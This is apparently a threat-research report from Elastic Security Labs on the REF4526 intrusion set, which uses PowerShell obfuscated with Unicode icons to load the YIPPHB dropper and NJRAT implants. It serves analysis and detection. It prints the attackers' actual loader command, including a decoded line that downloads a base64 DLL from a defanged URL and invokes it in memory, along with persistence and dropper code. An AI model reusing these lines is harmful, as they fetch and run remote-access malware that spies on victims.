---
title: "Doing time with the YIPPHB dropper"
slug: "doing-time-with-the-yipphb-dropper"
date: "2022-11-21"
subtitle: "Elastic Security Labs identified an interesting approach to frustrate the detection of the YIPPHB dropper and RAT implants."
description: "Elastic Security Labs outlines the steps collect and analyze the various stages of the REF4526 intrusion set. This intrusion set uses a creative approach of Unicode icons in Powershell scripts to install a loader, a dropper, and RAT implants."
author:
  - slug: seth-goodwin
  - slug: derek-ditch
  - slug: salim-bitam
  - slug: remco-sprooten
  - slug: andrew-pease
image: "time-watch-theme-machines-gears.jpg"
category:
  - slug: attack-pattern
tags:
  - ref4526
  - njrat
  - yipphb
---

## Key takeaways

- Elastic Security Labs identified 12 clusters of activity using a similar TTP of threading Base64 encoded strings with Unicode icons to load the YIPPHB dropper.
- YIPPHB is an unsophisticated, but effective, dropper used to deliver RAT implants going back at least May of 2022.
- The initial access attempts to use Unicode icons embedded in Powershell to delay automated analysis.

## Preamble

While reviewing telemetry data, Elastic Security Labs identified abnormal arguments during the execution of Powershell. A closer examination identified the use of Unicode icons within Base64-encoded strings. A substitution mechanism was used to replace the icons with ASCII characters.

Once the icons were replaced with ASCII characters, a repetitive process of collecting Base64 encoded files and reversed URLs was used to execute a dropper and a full-featured malware implant. The dropper and malware implant was later identified as YIPPHB and NJRAT, respectively.

This research focused on the following:

- Loader phase
- Dropper phase
- RAT phase
- Activity clusters
- Network infrastructure
- Hunting queries

## Analysis

The analysis of this intrusion set describes an obfuscation method we believe is intended to evade automated analysis of PowerShell commands, and which we characterize as rudimentary and prescriptive.

![Execution flow for the REF4526 intrusion set](/assets/images/doing-time-with-the-yipphb-dropper/image3.png)

### Loader phase

While analyzing Powershell commands in Elastic’s telemetry, we observed Unicode icons embedded into Powershell commands. The use of Unicode to obfuscate Powershell commands is not a technique we have observed.

```
"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -command $iUqm = 'JABSAG8AZABhAEMAbwBwAHkAIAA9ACAAJwATIK8ArwATIBMgrwATIBMgrwCvACcAOwBbAEIAeQB0AG⌚⌚⌚AWwBdAF0AIAAkAEQATABMACAAPQAgAFsAcwB5AHMAdABlAG0ALgBDAG8AbgB2AG⌚⌚⌚AcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQA⌚⌚⌚wB0AHIAaQBuAGcAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAG⌚⌚⌚AdAAuAFcAZQBiAEMAbABpAG⌚⌚⌚AbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQA⌚⌚⌚wB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwB0AGkAbgB5AH⌚⌚⌚AcgBsAC4AYwBvAG0ALwAyAG⌚⌚⌚AcgBwAGgANgBjAHMAJwApACkAOwBbAHMAeQBzAHQAZQBtAC4AQQBwAHAARABvAG0AYQBpAG4AXQA6ADoAQwB1AHIAcgBlAG4AdABEAG8AbQBhAGkAbgAuAEwAbwBhAGQAKAAkAEQATABMACkALgBHAG⌚⌚⌚AdAB⌚⌚⌚AHkAcABlACgAJwBOAHcAZwBvAHgATQAuAEsA⌚⌚⌚ABKAGEATgBqACcAKQAuAEcAZQB0AE0AZQB0AGgAbwBkACgAJwBQAF⌚⌚⌚AbABHAEsAQQAnACkALgBJAG4AdgBvAGsAZQAoACQAbgB1AGwAbAAsACAAWwBvAGIAagBlAGMAdABbAF0AXQAgACgAJwB0AHgAdAAuADAAMAAwADgAdABjAG8AMAAxAC8AMQA3ADkAOAAxADIAOAAyADQAOQAzADgAMgA4ADgANAAzADAAMQAvADMAMgA1ADkANwAxADkAMgA0ADkAOQA2ADMANgA1ADYANQA5AC8AcwB0AG4AZQBtAGgAYwBhAHQAdABhAC8AbQBvAGMALgBwAHAAYQBkAHIAbwBjAHMAaQBkAC4AbgBkAGMALwAvADoAcwBwAHQAdABoACcAIAAsACAAJABSAG8AZABhAEMAbwBwAHkAIAAsACAAJwAQEMwGJwbMBicAIAApACkA';$OWjuxD = [system.Text.Encoding]::Unicode.GetString( [system.Convert]::FromBase64String( $iUqm.replace('⌚⌚⌚','U') ) );$OWjuxD = $OWjuxD.replace('-¯¯--¯--¯¯', '[redacted].vbs');powershell.exe -windowstyle hidden -ExecutionPolicy Bypss -NoProfile -Command $OWjuxD
```

While this technique is not overly complex in that it simply replaces the icons with an ASCII character, it is creative. This technique could delay automated analysis of Base64 encoded strings unless the Powershell command was either fully executed or an analysis workflow was leveraged to process Unicode and replacement functions.

Looking at the Powershell command, we were able to identify a simple process to replace the Unicode watch icons (⌚⌚⌚) with a **U**. To illustrate what’s happening, we can use the data analysis tool created by the GCHQ: [CyberChef](https://gchq.github.io/CyberChef/).

By loading the “Find / Replace”, the “Decode Base64”, and the “Decode text (UTF-16LE)” recipes, we can decode the Powershell string.

![Decoding the Unicode Base64 Powershell string](/assets/images/doing-time-with-the-yipphb-dropper/image5.png)

Within the decoded string we can see how the loader, follow-on dropper, and implant are installed.

```
$RodaCopy = '-¯¯--¯--¯¯';[Byte[]] $DLL = [system.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://tinyurl[.]com/2erph6cs'));[system.AppDomain]::CurrentDomain.Load($DLL).GetType('NwgoxM.KPJaNj').GetMethod('PUlGKA').Invoke($null, [object[]] ('txt.0008tco01/1798128249382884301/325971924996365659/stnemhcatta/moc[.]ppadrocsid.ndc//:sptth' , $RodaCopy , 'တیای' ))
```

The loader is downloaded from `https://tinyurl[.]com/2erph6cs`. TinyURL is a popular URL shortening service, and while it has very legitimate uses, it can also be abused to hide malicious URLs that blend into normal network traffic.

To unfurl the TinyURL, we can use the JSON API endpoint from [Unshorten.me](https://unshorten.me/):

```
$ curl https://unshorten.me/json/tinyurl[.]com/2erph6cs
{
    "requested_url": "tinyurl[.]com/2erph6cs",
    "success": true,
    "resolved_url": "https://cdn.discordapp[.]com/attachments/1023796232872792096/1023798426636402818/dllsica.txt",
    "usage_count": 3,
    "remaining_calls": 8
}
```

Downloading **dllsica.txt** from the Discord content delivery network provided us with another Base64-encoded string. Unlike the previous Powershell string, the string from **dllsica.txt** can easily be decoded without substitutions.

Using the **cat** , **base64** , **xxd** , and **head** command line tools, we can see that this has a hexadecimal value of **4d5a** and an MZ magic number in the file header. This confirms we’re analyzing a PE file.

- **cat** - catenates a file
- **base64 -D** - the **-D** switch decodes a base64 encoded file
- **xxd** - creates a hexadecimal dump of an input
- **head** - returns the first 10 lines of a file

```
$ cat dllsica.txt | base64 -D | xxd | head

00000000: 4d5a 9000 0300 0000 0400 0000 ffff 0000  MZ..............
00000010: b800 0000 0000 0000 4000 0000 0000 0000  ........@.......
00000020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
00000030: 0000 0000 0000 0000 0000 0000 8000 0000  ................
00000040: 0e1f ba0e 00b4 09cd 21b8 014c cd21 5468  ........!..L.!Th
00000050: 6973 2070 726f 6772 616d 2063 616e 6e6f  is program canno
...truncated...
```

Next, we deobfuscated the binary, wrote it to disk, then generated a SHA-256 hash.

- **file** - verify the file type
- **shasum -a 256** - the -a 256 switch uses the 256-bit hashing algorithm

```
$ cat dllsica.txt | base64 -D > dllsica.bin

$ file dllsica.bin
dllsica.bin: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows

$ shasum -a 256 dllsica.bin
49562fda46cfa05b2a6e2cb06a5d25711c9a435b578a7ec375f928aae9c08ff2
```

Now that the loader has been collected, it executes the method **PUlGKA** inside of the class **NwgoxM.KPJaN**. From the original Base64 decoded string

```
…truncated…
GetType('NwgoxM.KPJaNj').GetMethod('PUlGKA').Invoke($null, [object[]]
...truncated…:
```

![The loader’s execution](/assets/images/doing-time-with-the-yipphb-dropper/image7.png)

We may publish future research on this loader, which maintains access by copying itself into the user's Startup folder as a natively-supported VBscript.

```
FileSystem.FileCopy(RodaCopy, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + NameCopy + ".vbs");
```

### Dropper phase

From the loader's execution image above, we can see that the loader uses a reversed variable (**text = bdw6ufv4/moc[.]lruynit//:sptth**) to download an additional file using a TinyURL. Using the command line tool, **rev** , we can correct the reversed URL.

```
$ echo "bdw6ufv4/moc.lruynit//:sptth" | rev

https://tinyurl[.]com/4vfu6wd
```

We can unfurl the TinyURL using the Unshorten.me JSON API endpoint to identify the download location of the dropper.

```
$ curl https://unshorten.me/json/tinyurl[.]com/4vfu6wd
{
    "requested_url": "tinyurl[.]com/4vfu6wd",
    "success": true,
    "resolved_url": "https://cdn.discordapp[.]com/attachments/1023796232872792096/1023796278213234758/pesica.txt",
    "usage_count": 2,
    "remaining_calls": 9
}
```

Another encoded file is downloaded from Discord: **pesica.txt**. As of this writing, VirusTotal reports zero detections of this file.

With clues from **dllsica.bin** , we can see that **pesica.txt** uses UTF-8 encoding. To further analyze our file, we need to replace the **▒▒▒▒** values with an **A** , and Base64 decode the resulting strings.

```
…truncated…
string text = "bdw6ufv4/moc[.]lruynit//:sptth";
string text2 = new WebClient
{
	Encoding = Encoding.UTF8
}.DownloadString(Strings.StrReverse(text));
text2 = Strings.StrReverse(text2);
text2 = text2.Replace("▒▒▒▒", "A");
string text3 = new WebClient().DownloadString(Strings.StrReverse(_5));
text3 = Strings.StrReverse(text3);
…truncated…
	{
	text4 + "\\InstallUtil.exe",
	Convert.FromBase64String(text3)
	});
…truncated…
```

We can stack recipes to perform these functions with CyberChef.

![Using CyberChef to decode pesica.txt](/assets/images/doing-time-with-the-yipphb-dropper/image2.png)

Once we’ve decoded **pesica.txt** , we calculate the hash **bba5f2b1c90cc8af0318502bdc8d128019faa94161b8c6ac4e424efe1165c2cf**. The decoded output of **pesica.txt** shows the **YippHB** module name.

```
...truncated...
ToInt16
<Module>
YippHB
ResumeThread_API
...truncated...
```

This module name is where the dropper name of YIPPHB is derived from. YIPPHB was originally discovered by security researcher [Paul Melson](https://twitter.com/pmelson). Paul [publicly disclosed](https://github.com/pmelson/bsidesaugusta_2022/blob/main/unk.yara) this dropper in October of 2022 at the Augusta BSides security conference.

The YIPPHB dropper is executed using the [Installutil.exe](https://learn.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool) command-line utility to start the RAT phase.

> We are referring to the next phase as the RAT phase. All of the binaries we were able to collect in this phase were RAT implants (NJRAT, LIMERAT, and ASYNCRAT); however, the modular nature of this intrusion set would allow for any implant type to be used.

### RAT phase

Now that the YIPPHB dropper has been executed, it picks up the second part of the original Unicode icon script to install the RAT implant.

```
…truncated…
('txt.0008tco01/1798128249382884301/325971924996365659/stnemhcatta/moc.ppadrocsid.ndc//:sptth' , $RodaCopy , 'တیای' ))
```

The RAT was retrieved from `https://cdn.discordapp[.]com/attachments/956563699429179523/1034882839428218971/10oct8000.txt`, which is reversed from **txt.0008tco01/1798128249382884301/325971924996365659/stnemhcatta/moc[.]ppadrocsid.ndc//:sptth**.

Looking at the file **10oct8000.txt** file, we can see that it is a reversed, Base64-encoded file.

```
=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA…truncated…
```

We can correct this file and Base64 decode it using the command-line tools **rev** and **base64** and save the output as **10oct8000.bin**.

```
$ cat 10oct8000.txt | rev | base64 -D > 10oct8000.bin
```

**10oct8000.bin** has a SHA256 hash of **1c1910375d48576ea39dbd70d6efd0dba29a0ddc9eb052cadd583071c9ca7ab3**. This file is reported on VirusTotal as a variant of the [LIMERAT](https://malpedia.caad.fkie.fraunhofer.de/details/win.limerat) or [NJRAT](https://malpedia.caad.fkie.fraunhofer.de/details/win.njrat) malware families (depending on the source).

Like the loader and YIPPHB dropper, we’ll look at some basic capabilities of the RAT, but not fully reverse it. Researching these capabilities led us to previous research that associates this sample with NJRAT or LIMERAT ([1](https://neonprimetime.blogspot.com/2018/10/njrat-lime-ilspy-decompiled-code-from.html), [2](https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/)).

The RAT starts its execution routine by connecting back to the command and control server. In a separate thread, it also starts a keylogger routine to gather as much information as possible.

![NJRAT C2 configuration variables](/assets/images/doing-time-with-the-yipphb-dropper/image8.png)

For the connection to the command and control server, the RAT uses the configuration information listed as global variables. The victimName variable ( **TllBTiBDQVQ=** ) is a Base64 encoded string that decodes to “NYAN CAT”. Based on the code similarity with [a known NJRAT code base](https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp/blob/master/njRAT%20C%23%20Stub/Program.cs), this C2 configuration information adds to our conviction that this is related to NJRAT.

![NJRAT code from Github](/assets/images/doing-time-with-the-yipphb-dropper/image4.jpg)

If the RAT is connected to a command and control server that is listening for commands, it sends the following additional information:

- victimName ( **vn** )
- Hardware ID
- Username
- OSFullName
- OSVersion Servicepack
- if the Program Files folder ends in **X86** or not
- if a webcam is present
- the window name
- a permission check on the registry

If successfully connected to a C2 server, the operator is able to interact with the implant through a series of commands. Security researchers Hido Cohen and CyberMasterV provide a thorough explanation of these commands, and the overall functionality of the RAT, [here](https://hidocohen.medium.com/njrat-malware-analysis-198188d6339a) and [here](https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/)

### Activity clusters

We were able to run additional searches through our telemetry data to identify several clusters of activity. We’ve provided an EQL query below:

```
intrusion_detection where (process.pe.original_file_name == "PowerShell.EXE" and process.command_line like "*Unicode.GetString*" and process.args like "*replace*")
```

This query allowed us to identify Powershell activity that uses both Unicode characters and the **replace** function.

![Timeline of REF4526 events](/assets/images/doing-time-with-the-yipphb-dropper/image6.png)

Looking at these results, we were able to cluster activity by the variable name in combination with the Unicode icon. In the example that sourced this initial research, one cluster would be the variable **iUqm** and the ⌚⌚⌚Unicode icons.

| Cluster ID | Variable | Unicode icon + number | Percentage of prevalence (rounded) |
| ---------- | -------- | --------------------- | ---------------------------------- |
| 1          | ngfYq    | ❞ (U+275E)            | 1%                                 |
| 2          | Codigo   | ❤ (U+2764)           | 1%                                 |
| 3          | iUqm     | ⌚ (U+231A)           | 9%                                 |
| 4          | iUqm     | ⚔ (U+2694)           | 6%                                 |
| 5          | Codigo   | ⁂ (U+2042)            | 62%                                |
| 6          | iUqm     | ✌ (U+270C)           | 1%                                 |
| 7          | Codigo   | ⏏ (U+23CF)           | 1%                                 |
| 8          | Cg1O     | ☈ (U+2608)            | 5%                                 |
| 9          | Codigo   | ♔ (U+2654)            | 10%                                |
| 10         | iUqm     | ﭏ (U+FB4F)            | 1%                                 |
| 11         | Codigo   | \_\*\/\}+/\_=         | 1%                                 |
| 12         | iUqm     | ☈ (U+2608)            | 2%                                 |

Of note, cluster 11 uses all of the same techniques as the other clusters, but instead of a Unicode icon for substitution, it used a series of ASCII characters ( **\_\*\/\}+/\_=** ). The intrusion operated the same way and we are unclear why this cluster deviated from using a Unicode icon.

### Collecting and parsing network data

To scale the analysis of this intrusion set, we wanted to automate the extraction of the loader and dropper encoded URLs from the **process.command_line** fields and the follow-on C2 used by the RAT implants.

#### Loader and Dropper

As noted in the Loader and Dropper phases, the Base64-encoded string needs substitution of the Unicode icons and to be reversed and decoded. After that process, the first URL is readily available, while the second URL requires reversing yet again.

To avoid execution of the Powershell command itself, we can leverage the text processing tool **awk**. What follows is a breakdown of how to do the analysis and we’ll provide a shell script with all of it for reference.

To get started, we’ll need to get access to our data on the command line where we can pipe it to **awk**. We’ve [published a tool](https://github.com/elastic/securitylabs-thrunting-tools) called **eql-query** (and another called **lucene-query** ) to do just that.

Using **eql-query** , we can run an EQL query to retrieve the last 180-days of results, retrieving only the **process.command_line** field. The value of doing this from the command line is that it allows us to further parse the data and pull out additional strings of interest.

```
eql-query --since 'now-180d/d' --size=1000 --compact --fields 'process.command_line' 'intrusion_detection where (process.pe.original_file_name == "PowerShell.EXE" and process.command_line like "*Unicode.GetString*" and process.args like "*replace*")'
```

Next, use **jq** to pass the raw string to **awk** using **jq '.\_source.process.command_line' -r | awk**.

> If you’re doing this iteratively, it’s best to write the results from **eql-query** to a file, and then operate on the results locally until you have your pipeline how you’d like it.

The next step is to capture the strings used in the Powershell **replace** commands so we can perform that function ourselves. The best way to do this using **awk** is by capturing them with a regular expression.

This matches the first and second arguments to replace. The first argument is Unicode and possibly not friendly as an **awk** pattern, so we’ll need to escape it first. Once we’ve made the replacement, we’ll print out the “clean” code, the string to find, and the replacement text.

```
function escape_string( str ) {
    gsub(/[\\.^$(){}\[\]|*+?]/, "\\\\&", str)
    return str
}
{
    match($0, /replace\('\''(.*)'\'' *, *'\''(.*)'\''/, arr);
    str=escape_string(arr[1]);
    rep=arr[2];
    print gensub(str, rep, "g")
}
```

Finally we can **grep** out the Base64 code (using another regex) and reveal the obfuscated Powershell script.

```
grep -oP ''\''\K[A-Za-z0-9+/]+={0,2}(?='\'';)'
```

This automates the manual conversion process we outlined in the Loader, Dropper, and RAT phases above.

```
$RodaCopy = '-¯¯--¯--¯¯';[Byte[]] $DLL = [system.Convert]::FromBase64String((New-Object Net.WebClient).DownloadString('https://tinyurl[.]com/2erph6cs'));[system.AppDomain]::CurrentDomain.Load($DLL).GetType('NwgoxM.KPJaNj').GetMethod('PUlGKA').Invoke($null, [object[]] ('txt.0008tco01/1798128249382884301/325971924996365659/stnemhcatta/moc[.]ppadrocsid.ndc//:sptth' , $RodaCopy , 'တیای' ))
```

Parsing the URLs from this text should be another simple **awk** match, followed by flipping the second URL, however, Powershell’s default encoding is **UTF-16LE** and **awk** only supports **UTF-8** or ASCII encoding. A tool called [**iconv**](https://linux.die.net/man/1/iconv) can perform the necessary conversion.

```
echo "${line}" | base64 -d | iconv -f UTF-16 -t UTF-8 | awk '{ if ( match($0, /'\''([^'\'']+\/\/:s?ptth)'\''/, arr)) { n=split(arr[1],arr2,""); for(i=1;i<=n;i++){s=arr2[i] s}; print s}; if ( match($0, /'\''(https?:\/\/[^'\'']+)'\''/, arr)){ print arr[1] } }'
```

Once converted, the rest is straightforward parsing. Our output will contain **url1** , **url2** , and a copy of the Unicode strings and their replacements. The URLs are the forward and reverse URLs for each code sample, respectively.

| Unicode icon | Replacement | url1                                         | url2                                                         |
| ------------ | ----------- | -------------------------------------------- | ------------------------------------------------------------ |
| ⌚⌚⌚        | U           | `https://tinyurl[.]com/2erph6cs`             | `https://cdn.discordapp[.]com/...truncated.../10oct8000.txt` |
| ⌚⌚⌚        | U           | `http://91.241.19[.]49/ARTS/dllf3txt`        | `http://91.241.19[.]49/test/new/ZX1.txt`                     |
| ⁂            | A           | `http://20.231.55[.]108/dll/06-07-2022.PDF`  | `http://212.192.246[.]226/dsaffdffa.txt`                     |

For further details or to try it against your own data, see the [shell script](https://assets.contentstack.io/v3/assets/bltefdd0b53724fa2ce/blt8f67cd063158a2dc/637bc872cca9f010a904ea67/ref4526_url_extraction.zip) that combines it all.

Now that we have automated the collection and parsing of the URLs for the loader and dropper, we can move on to the RAT infrastructure.

#### RAT

As evident in the original Powershell script, we know the RAT uses additional network infrastructure. To enumerate this, we need to pull down the RAT much like the dropper would, take a unique set URLs for each **url1** and **url2** output in the previous step, loop through each list, and use **curl** to download them.

> This process requires interacting with adversary-owned or controlled infrastructure. Interacting with adversary infrastructure requires disciplined preparation that not all organizations are ready to pursue. If you don't already have strong knowledge of legal considerations, defensive network egress points, sandboxes, an intelligence gain/loss strategy, etc., the following is presented informationally.

As the loader never saves the downloaded files to disk and there aren’t always filenames, so to keep track of samples, we’ll use a simple counter. This gives us this simple loop:

```
ctr=1
for line in $(cat ../url-1.txt); do
    curl -v -A "${USER_AGENT}" -o "file-${ctr}" -L --connect-timeout 10 "${line}" 2>>"log-${ctr}.txt"
    ctr=$((ctr + 1))
done
```

We use **-v** to capture the request and response headers, **-L** to follow redirects, and **--connect-timeout** to speed up the process when the infrastructure is down. Finally, save the **curl** output to a log file while any files downloaded are saved as **file-X** , where **X** is the value of the counter.

Any RAT files downloaded are Base64-encoded. We can identify valid Base64-encoded files using the **file** command. A Base64-encoded file will be identified as “ASCII text, with very long lines (_length_), with no line terminators” where _length_ is the file size. For files that match this language, we’ll decode them and save them with a **.dll** extension.

```
for entry in $(file file-?? | awk -F": " '$2 ~ /^ASCII text.*very long lines/  {print $1}'); do
    rev  <"${entry}" | base64 -d >"${entry}.dll"
done
```

Now that we have the RAT binaries, we can do some typical static analysis on them. If you have the [VirusTotal command line tool](https://github.com/VirusTotal/vt-cli) and can make API queries, searching for known files is another simple loop over all the saved **dll** files.

```
for entry in *.dll; do
	hash=$(sha256sum "${entry}" | awk '{print $1}')
	vt search "${hash}" >"${entry}.vt.yml"
done
```

Looking at the output, we can see that any **yml** file (the **vt** command output) with **0** bytes means no match. These files are unknown to VirusTotal. In this output, we can see that **file-30.dll** , **file-31.dll** , and **file-34.dll** are unknown to VirusTotal.

```
$ ls -s *.dll{,.vt.yml}

 32 file-28.dll
 32 file-28.dll.vt.yml
 32 file-30.dll
  0 file-30.dll.vt.yml
 32 file-31.dll
  0 file-31.dll.vt.yml
468 file-34.dll
  0 file-34.dll.vt.yml
 48 file-35.dll
 40 file-35.dll.vt.yml
 80 file-38.dll
 36 file-38.dll.vt.yml
```

The final analysis we’re going to perform is to attempt to dump any domain names from the DLLs. For many executable file formats, the **strings** command can provide that information. Unfortunately, most of these DLLs are .Net assemblies and the **strings** command won’t work to extract strings from .Net assemblies. The **file** command can again help us identify these as in this example:

```
$ file file-31.dll
file-31.dll: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows
```

The upside of .Net is that it is easily disassembled and the Mono project provides a tool just for that purpose, [**ikdasm**](https://www.mono-project.com/docs/tools+libraries/tools/). This gives us our final loop to search for domain names or references to HTTP URLs.

```
for item in *.dll; do
    ikdasm "${item}" | grep -E '(\.(org|com|net|ly))|((yl|ten|moc|gro)\.)|("http|ptth")';
Done
```

For more details you can refer to this [shell script](https://assets.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltdeb8fbbb0f53fa97/637bc87271c75510a0ca1a95/ref4526_rat_collection.zip) that puts this second stage of analysis together.

## Diamond Model

Elastic Security utilizes the [Diamond Model](https://www.activeresponse.org/wp-content/uploads/2013/07/diamond.pdf) to describe high-level relationships between adversaries and victims of intrusions.

![REF4526 diamond model](/assets/images/doing-time-with-the-yipphb-dropper/image1.png)

## Observed adversary tactics and techniques

Elastic uses the MITRE ATT&CK framework to document common tactics, techniques, and procedures that advanced persistent threats use against enterprise networks.

### Tactics

Tactics represent the why of a technique or sub-technique. It is the adversary’s tactical goal: the reason for performing an action.

- [Resource Development](https://attack.mitre.org/tactics/TA0042/)
- [Execution](https://attack.mitre.org/tactics/TA0002/)
- [Persistence](https://attack.mitre.org/tactics/TA0003/)
- [Defense Evasion](https://attack.mitre.org/tactics/TA0005/)
- [Discovery](https://attack.mitre.org/tactics/TA0007/)
- [Command and Control](https://attack.mitre.org/tactics/TA0011/)

### Techniques / Sub techniques

Techniques and Sub techniques represent how an adversary achieves a tactical goal by performing an action.

- [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583/)
- [Stage Capabilities: Upload Malware](https://attack.mitre.org/techniques/T1608/001/)
- [Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001/)
- [Command and Scripting Interpreter: Visual Basic](https://attack.mitre.org/techniques/T1059/005/)
- [Command and Scripting Interpreter: PowerShell](https://attack.mitre.org/techniques/T1059/001/)
- [System Binary Proxy Execution: InstallUtil](https://attack.mitre.org/techniques/T1218/004/)
- [Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027/)

## Detection logic

### Behavior rules

- [Connection to WebService by a Signed Binary Proxy](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/command_and_control_connection_to_webservice_by_a_signed_binary_proxy.toml)
- [Suspicious PowerShell Execution](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_suspicious_powershell_execution.toml)
- [Process Execution with Unusual File Extension](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/defense_evasion_process_execution_with_unusual_file_extension.toml)
- [Script File Written to Startup Folder](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/persistence_script_file_written_to_startup_folder.toml)
- [Suspicious PowerShell Execution via Windows Scripts](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/execution_suspicious_powershell_execution_via_windows_scripts.toml)
- [Connection to Dynamic DNS Provider by an Unsigned Binary](https://github.com/elastic/protections-artifacts/blob/main/behavior/rules/command_and_control_connection_to_dynamic_dns_provider_by_an_unsigned_binary.toml)

### Hunting queries

Identifying Unicode in Powershell can be accomplished with either a KQL or EQL query.

The events for both KQL and EQL are provided with the Elastic Agent using the Elastic Defend integration.

#### KQL query

Using the Discover app in Kibana, the below query will identify the use of Powershell with Unicode strings. While this identified all of the events in this research, it also identified other events that were not part of the REF4526 intrusion set.

The proceeding and preceding wildcards ( **\*** ) can be an expensive search over a large number of events.

```
process.pe.original_file_name : "PowerShell.EXE" and process.command_line : (*Unicode.GetString* and *replace*)
```

#### EQL query

Using the [Timeline section](https://www.elastic.co/guide/en/security/current/timelines-ui.html#filter-with-eql) of the Security Solution in Kibana under the “Correlation” tab, this query will identify the use of Powershell with Unicode strings and the **replace** function. This identified all observed REF4526 events.

```
intrusion_detection where (process.pe.original_file_name == "PowerShell.EXE" and process.command_line like "*Unicode.GetString*" and process.args like "*replace*")
```

## References

The following were referenced throughout the above research:

- [https://github.com/pmelson/bsidesaugusta_2022/blob/main/unk.yara](https://github.com/pmelson/bsidesaugusta_2022/blob/main/unk.yara)
- [https://malpedia.caad.fkie.fraunhofer.de/details/win.limerat](https://malpedia.caad.fkie.fraunhofer.de/details/win.limerat)
- [https://malpedia.caad.fkie.fraunhofer.de/details/win.njrat](https://malpedia.caad.fkie.fraunhofer.de/details/win.njrat)
- [https://neonprimetime.blogspot.com/2018/10/njrat-lime-ilspy-decompiled-code-from.html](https://neonprimetime.blogspot.com/2018/10/njrat-lime-ilspy-decompiled-code-from.html)
- [https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/](https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/)
- [https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp/blob/master/njRAT%20C%23%20Stub/Program.cs](https://github.com/NYAN-x-CAT/njRAT-0.7d-Stub-CSharp/blob/master/njRAT%20C%23%20Stub/Program.cs)
- [https://hidocohen.medium.com/njrat-malware-analysis-198188d6339a](https://hidocohen.medium.com/njrat-malware-analysis-198188d6339a)
- [https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/](https://cybergeeks.tech/just-another-analysis-of-the-njrat-malware-a-step-by-step-approach/)

## Observables

All observables are also available for [download](https://assets.contentstack.io/v3/assets/bltefdd0b53724fa2ce/bltc0eb869ac242975f/637bf8b1fa033a109b5d94bd/ref4526-indicators.zip) in both ECS and STIX format in a combined zip bundle.

The following observables were discussed in this research.

| Observable                                                                                      | Type        | Reference     | Note                             |
| ----------------------------------------------------------------------------------------------- | ----------- | ------------- | -------------------------------- |
| 49562fda46cfa05b2a6e2cb06a5d25711c9a435b578a7ec375f928aae9c08ff2                                | SHA-256     | dllsica.bin   | Initial loader                   |
| bba5f2b1c90cc8af0318502bdc8d128019faa94161b8c6ac4e424efe1165c2cf                                | SHA-256     | pesica.bin    | YIPPHB downloader                |
| 1c1910375d48576ea39dbd70d6efd0dba29a0ddc9eb052cadd583071c9ca7ab3                                | SHA-256     | 10oct8000     | NJRAT implant                    |
| `https://cdn.discordapp[.]com/attachments/956563699429179523/1034882839428218971/10oct8000.txt` | url         | Loader phase  | NJRAT download location          |
| `https://tinyurl[.]com/2erph6cs`                                                                | url         | Loader phase  | REF4526 loader download location |
| `https://tinyurl[.]com/4vfu6wd`                                                                 | url         | Dropper phase | YIPPHB download location         |
| wins10ok.duckdns[.]org                                                                          | domain-name | NJRAT C2      | NA                               |
